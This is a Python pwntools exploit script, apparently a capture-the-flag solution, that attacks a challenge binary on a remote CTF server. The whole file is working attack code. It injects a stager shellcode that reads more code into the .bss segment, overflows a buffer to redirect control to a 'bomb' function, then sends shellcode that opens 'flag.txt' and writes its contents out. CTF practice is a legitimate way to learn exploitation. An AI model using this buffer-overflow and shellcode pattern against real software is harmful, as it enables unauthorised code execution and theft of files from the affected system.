#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('chall')
addr = elf.bss(0x200)
context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef\nb *0x00401356')
p = remote('chall.nitdgplug.org', 30104)


shellcode1 = """
mov rsi, {addr}
mov rdx, 0x100
xor rdi, rdi
xor rax,rax
syscall
mov r12, {addr}
jmp r12
""".format(addr=addr)

shellcode1 = asm(shellcode1)

p.sendlineafter(" say something:\n", shellcode1)
p.sendlineafter("you one more chance:\n", "A" * 24 + p64(elf.symbols['bomb']))

shellcode = """
    push 1
    dec byte ptr [rsp]
    mov rax, 0x7478742e67616c66
    push rax
mov rdi, rsp
mov rsi, 0x0
mov rax, 2
syscall
mov rsi, {addr} + 0x100
mov r12, {addr} + 0x200
mov [r12], rax
mov rdx, 0x100
mov rdi, rax
xor rax,rax
syscall
mov rdi, 1
mov rsi, {addr} + 0x104
mov rdx, 0x100
mov rax,1
syscall
""".format(addr=addr + 0x100)

shellcode = asm(shellcode)

p.sendline(shellcode)

# p.sendline("/chall\x00")


p.interactive()
